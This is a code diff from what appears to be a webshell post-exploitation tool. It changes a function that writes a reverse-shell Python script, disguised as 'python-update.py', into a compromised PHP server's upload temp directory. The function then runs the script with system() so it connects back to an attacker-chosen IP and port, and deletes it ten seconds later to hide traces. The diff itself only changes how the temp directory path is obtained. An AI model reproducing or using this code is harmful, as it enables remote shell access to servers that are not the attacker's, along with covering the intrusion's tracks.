@@ -1,6 +1,6 @@
 from threading import Thread
 
-from libs.config import alias, color
+from libs.config import alias, color, gget
 from libs.myapp import send, delay_send, has_env, is_windows
 
 
@@ -144,17 +144,18 @@ def run(ip: str, port: str, reverse_type: str = "php"):
             python = get_reverse_python(ip, port)
             if is_windows():
                 pyname = "python-update.py"
+                upload_tmp_dir = gget("webshell.upload_tmp_dir", "webshell")
                 text = send(
-                    f"print(file_put_contents(ini_get('upload_tmp_dir').'\\\\{pyname}', \"{python}\"));"
+                    f"print(file_put_contents('{upload_tmp_dir}\\\\{pyname}', \"{python}\"));"
                 ).r_text.strip()
                 if not len(text):
-                    print(color.red("Failed to write file in current directory."))
+                    print(color.red("Failed to write file in tmp_upload directory."))
                     return
-                t = Thread(target=send, args=(f"system('python '.ini_get('upload_tmp_dir').'\\\\{pyname}');",))
+                t = Thread(target=send, args=(f"system('python {upload_tmp_dir}\\\\{pyname}');",))
                 t.setDaemon(True)
                 t.start()
                 t2 = Thread(
-                    target=delay_send, args=(10.0, f"unlink(ini_get('upload_tmp_dir').'\\{pyname}');",)
+                    target=delay_send, args=(10.0, f"unlink('{upload_tmp_dir}\\\\{pyname}');",)
                 )
                 t2.setDaemon(True)
                 t2.start()
